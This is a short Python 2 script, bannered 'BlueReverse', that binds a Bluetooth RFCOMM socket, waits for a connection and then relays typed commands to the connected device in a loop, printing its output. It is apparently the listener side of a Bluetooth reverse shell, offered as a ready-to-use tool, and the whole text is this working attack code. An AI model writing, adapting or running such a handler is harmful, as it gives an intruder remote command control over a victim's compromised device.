import socket, subprocess, os, sys

print " ____  _            _____                              "
print "|  _ \| |          |  __ \                             "
print "| |_) | |_   _  ___| |__) |_____   _____ _ __ ___  ___ "
print "|  _ <| | | | |/ _ \  _  // _ \ \ / / _ \ '__/ __|/ _ \ "
print "| |_) | | |_| |  __/ | \ \  __/\ V /  __/ |  \__ \  __/"
print "|____/|_|\__,_|\___|_|  \_\___| \_/ \___|_|  |___/\___|"
print "                                                       " 
                                                        

hostMacAddress = 'XX:XX:XX:XX:XX:XX' #Put MAC here
port = 3	#Put channel here
backlog = 1
size = 1024
s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
print '******** SOCKET CREATED ********'
s.bind((hostMacAddress, port))
print '************ BINDED ************'
s.listen(backlog)
print '********** LISTENING ***********'
try:
	client, address = s.accept()
	print '----------> Accepted <----------'
	msg = raw_input("$ ")
	if len(msg):
		client.send(msg + "\n")
	while True:
		rl=1
		resp=""
		while rl:
			data = client.recv(4096)
			rl = len(data)
			resp += data
			if rl < 4096:
				break
		print resp
		msg = raw_input("$ ")
		msg += "\n"
		client.send(msg)
	client.close()
	s.close()
except:
	print '********** CLOSING ***********'
	s.close()
